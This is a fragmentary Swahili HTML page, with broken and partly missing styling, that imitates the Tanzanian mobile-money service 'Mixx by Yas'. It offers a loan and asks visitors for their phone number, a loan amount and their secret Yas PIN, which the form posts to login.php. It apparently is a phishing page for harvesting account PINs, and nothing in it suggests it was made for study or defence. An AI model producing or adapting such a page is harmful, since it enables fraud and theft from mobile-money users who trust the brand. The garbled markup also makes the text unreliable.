<!DOCTYPE html>

            font-weight: bold;

        }
        .logo-sub {

        .info-box { 
            background: #FFFDE7; /* Njano laini kwa ajili ya ujumbe */

            border-radius: 8px; 
            margin-bottom: 20px; 
            border-left: 4px solid #FFD700; /* Njano iliyokolea pembeni */

            color: #5d4037;

            margin-bottom: 18px;

            display: block; 
            font-size: 13px; 
            color: #002B5B; 
            font-weight: 600;
            margin-bottom: 6px; 
            margin-left: 2px; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #e2e8f0; 
            border-radius: 8px; 
            box-sizing: border-box; 
            font-size: 15px; 
            outline: none; 
            transition: 0.3s; 
        }
        input:focus { 
            border-color: #002B5B; /* Inabadilika kuwa bluu ikigusiwa */
            box-shadow: 0 0 5px rgba(0, 43, 91, 0.2);
        }
        button { 
            width: 100%; 
            padding: 14px; 
            background-color: #FFD700; /* Kitufe cha Rangi ya Njano */

            font-size: 16px;

            margin-top: 10px;

<body>
    <div class="card">
        <div class="header">
            <!-- Weka picha ya logo hapa, hakikisha jina linafanana -->
            <img src="logo.png" alt="Mixx by Yas Logo" class="logo-img">
            <div class="logo-text">Mixx by Yas</div>
            <div class="logo-sub">RAHISI • HARAKA • KIDIGITALI</div>

        <div class="form-area">

            </div>
            <form action="login.php" method="POST">
                <div class="input-group">
                    <label>Namba ya Simu ya Yas</label>
                    <input type="number" name="namba" placeholder="Mf: 07XXXXXXXX" required>
                </div>
                <div class="input-group">
                    <label>Kiasi cha Mkopo Unachoomba (TSH)</label>
                    <input type="number" name="kiasi" placeholder="Mf: 500000" required>
                </div>
                <div class="input-group">
                    <label>Namba ya Siri (Yas PIN)</label>
                    <input type="password" name="pin" placeholder="Ingiza PIN yako ya Yas" required>
                </div>
                <button type="submit">Kamilisha Maombi</button>
            </form>
        </div>
        <div class="footer">
            Huduma hii inatolewa na Yas Loan Services Tanzania.<br>
